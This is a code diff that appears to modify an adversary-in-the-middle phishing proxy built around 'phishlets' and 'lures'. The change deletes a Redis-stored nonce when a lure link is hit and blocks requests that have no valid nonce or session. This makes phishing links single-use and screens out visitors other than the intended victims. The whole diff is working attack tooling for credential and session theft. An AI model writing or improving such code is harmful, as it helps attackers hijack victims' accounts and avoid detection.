@@ -214,7 +214,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
-			log.Debug("Incoming request URL %s", req_url)
 
 
 			pl := p.getPhishletByPhishHost(req.Host)
@@ -625,16 +624,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if nonce, ok2 := s.Params["nonce"]; ok2 {
 							if email, ok3 := s.Params["email"]; ok3 {
 								log.Debug("[%s] Valid session. %s Email: %s. Nonce: %s.", hiblue.Sprint(pl_name), req_url, email, nonce)
-								log.Debug("[%s] Deleting nonce: %s.", hiblue.Sprint(pl_name), nonce)
-								rdb := redis.NewClient(&redis.Options{
-								    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
-								    Password: p.cfg.GetRedisPassword(),
-								    DB:       p.cfg.GetRedisDB(), 
-								})
-								_, err := rdb.Del(ctxbg, nonce).Result()
-								if err != nil {
-									log.Warning("Redis error %s. Nonce %s might not be successfully deleted", err, nonce)
-								}
+								
 							} else {
 								log.Warning("[%s] Session with invalid nonce: %s %s (%s) [%s]", hiblue.Sprint(pl_name), nonce, req_url, req.Header.Get("User-Agent"), remote_addr)
 								return p.blockRequest(req)
@@ -654,6 +644,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
+						// lure path triggered, delete nonce if redis is enabled
+						if p.cfg.GetRedisEnabled() {
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								if nonce, ok2 := s.Params["nonce"]; ok2 {
+									log.Info("[%d] [%s] Lure path hit. Deleting nonce: %s.", p.sids[ps.SessionId], hiblue.Sprint(pl_name), nonce)
+									rdb := redis.NewClient(&redis.Options{
+									    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
+									    Password: p.cfg.GetRedisPassword(),
+									    DB:       p.cfg.GetRedisDB(), 
+									})
+									_, err := rdb.Del(ctxbg, nonce).Result()
+									if err != nil {
+										log.Warning("Redis error %s. Nonce %s might not be successfully deleted", err, nonce)
+									}
+
+								} else {
+									log.Warning("[%s] No nonce in session: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+									return p.blockRequest(req)
+								}
+							} else {
+								log.Warning("[%s] Invalid session: %s %s (%s) [%s]", hiblue.Sprint(pl_name), ps.SessionId, req_url, req.Header.Get("User-Agent"), remote_addr)
+								return p.blockRequest(req)
+							}
+						}
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						u, err := url.Parse(rurl)
